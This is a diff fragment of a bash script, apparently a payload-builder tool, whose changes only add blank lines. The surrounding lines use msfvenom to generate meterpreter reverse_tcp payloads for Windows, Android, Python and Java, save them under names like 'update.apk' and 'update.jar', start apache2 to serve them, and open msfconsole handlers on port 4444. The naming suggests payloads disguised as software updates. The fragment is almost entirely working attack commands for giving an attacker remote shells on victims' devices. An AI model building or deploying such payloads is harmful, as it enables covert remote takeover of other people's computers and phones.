@@ -55,6 +55,7 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip 
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+
 # 2
 elif [ "$x" == "$apk" ]; then                          
 msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.apk
@@ -62,6 +63,7 @@ msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+
 # 3
 elif [ "$x" == "$py" ]; then                       
 msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.py
@@ -71,6 +73,7 @@ msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
+
 # 4
 elif [ "$x" == "$jar" ]; then                        
 msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/update.jar
